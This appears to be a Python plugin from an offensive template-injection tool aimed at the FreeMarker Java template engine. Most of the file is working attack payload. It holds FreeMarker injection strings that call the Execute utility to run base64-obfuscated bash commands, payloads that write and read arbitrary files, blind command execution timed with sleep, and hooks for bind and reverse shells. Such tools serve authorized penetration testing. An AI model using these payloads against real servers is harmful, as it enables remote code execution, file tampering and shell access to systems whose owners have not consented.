from utils.strings import quote, chunkit, md5
from utils.loggers import log
from utils import rand
from core.plugin import Plugin
from core import languages
import re

class Freemarker(Plugin):

    actions = {
        'render' : {
            'render': '${%(code)s}',
            'header': '${%(header)s?c}',
            'trailer': '${%(trailer)s?c}',
            'render_test': """%(r1)s}<#--%(comment)s-->${%(r2)s""" % { 
                'r1' : rand.randints[0],
                'comment' : rand.randints[1],
                'r2' : rand.randints[2]
            },
            'render_expected': '%(r1)s%(r2)s' % { 
                'r1' : rand.randints[0],
                'r2' : rand.randints[2]
            }
        },
        'write' : {
            'call' : 'inject',
            'write' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s") }""",
            'truncate' : """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {echo,-n,}>%(path)s") }""",
        },
        'read' : {
            'call': 'execute',
            'read' : """base64<'%(path)s'"""
        },
        'md5' : {
            'call': 'execute',
            'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
        },
        # Prepared to used only for blind detection. Not useful for time-boolean
        # tests (since && characters can\'t be used) but enough for the detection phase.
        'blind' : {
            'call': 'execute_blind',
            'bool_true' : 'true',
            'bool_false' : 'false'
        },
        # Not using execute here since it's rendered and requires set headers and trailers
        'execute_blind' : {
            'call': 'inject',
            'execute_blind': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}") }"""
        },
        'execute' : {
            'call': 'render',
            'execute': """<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}") }"""
        },
        'bind_shell' : {
            'call' : 'execute_blind',
            'bind_shell': languages.bash_bind_shell
        },
        'reverse_shell' : {
            'call': 'execute_blind',
            'reverse_shell' : languages.bash_reverse_shell
        }

    }


    contexts = [


        # Text context, no closures
        { 'level': 0 },

        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : languages.java_ctx_closures },

        # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
        { 'level': 2, 'prefix': '%(closure)s>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
        { 'level': 5, 'prefix': '-->', 'suffix' : '<#--' },
        { 'level': 5, 'prefix': '%(closure)s as a></#list><#list [1] as a>', 'suffix' : '', 'closures' : languages.java_ctx_closures },
    ]


    language = 'java'

    def rendered_detected(self):

        expected_rand = str(rand.randint_n(2))
        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('execute', True)
            self.set('write', True)
            self.set('read', True)
            self.set('bind_shell', True)
            self.set('reverse_shell', True)

            os = self.execute("""uname""")
            if os and re.search('^[\w-]+$', os):
                self.set('os', os)

    def blind_detected(self):

        # No blind code evaluation is possible here, only execution

        # Since execution has been used to detect blind injection,
        # let's assume execute_blind as set.
        self.set('execute_blind', True)
        self.set('write', True)
        self.set('bind_shell', True)
        self.set('reverse_shell', True)
